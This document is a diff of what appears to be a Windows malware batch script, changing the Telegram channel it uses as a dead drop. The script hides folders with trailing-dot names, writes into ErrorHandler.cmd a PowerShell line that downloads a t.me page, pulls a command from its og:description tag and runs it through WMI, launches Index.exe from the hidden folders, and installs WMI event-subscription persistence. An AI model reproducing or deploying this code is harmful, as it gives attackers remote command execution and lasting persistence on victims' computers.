@@ -27,7 +27,7 @@ fsutil file setshortname C:\ProgramData\config..\ ""
 fsutil file setshortname C:\ProgramData\logdata..\ ""
 fsutil file setshortname C:\ProgramData\diaglogs..\ ""
 
-echo powershell.exe -NoProfile -Command "$u='https://t.me/s/apinono';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
+echo powershell.exe -NoProfile -Command "$u='https://t.me/s/rurmetm';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
 echo powershell.exe \\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
 echo powershell.exe \\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini >> "%ProgramData%\USOShared\logs.cmd"
 
@@ -64,3 +64,4 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
 
 sc start Performance
+
